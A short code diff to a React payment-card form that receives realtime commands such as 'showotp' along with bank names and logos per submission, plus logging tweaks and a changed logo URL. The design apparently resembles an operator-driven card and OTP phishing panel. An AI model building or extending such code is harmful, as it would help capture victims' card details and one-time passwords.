@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
@@ -188,13 +189,14 @@ const PaymentForm = () => {
           const bankName = payload.new.bank_name;
           const bankLogo = payload.new.bank_logo;
           
-          // Only process commands for the current submission
+          console.log('Processing command:', command, 'for submission:', submissionId);
+          console.log('Current submission ID:', currentSubmissionId);
+          
+          // Process commands for the current submission or global commands
           if (submissionId && submissionId !== currentSubmissionId) {
             console.log('Command not for current submission, ignoring');
             return;
           }
-          
-          console.log('Processing command:', command, 'for submission:', submissionId);
           
           switch (command) {
             case 'showotp':
@@ -657,7 +659,7 @@ const PaymentForm = () => {
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
           <img 
-            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/RuPay.svg/2560px-RuPay.svg.png" 
+            src="https://logotyp.us/file/rupay.svg" 
             alt="RuPay" 
             className="h-6 w-12 object-contain" 
             style={{ filter: 'brightness(0) saturate(100%)' }}
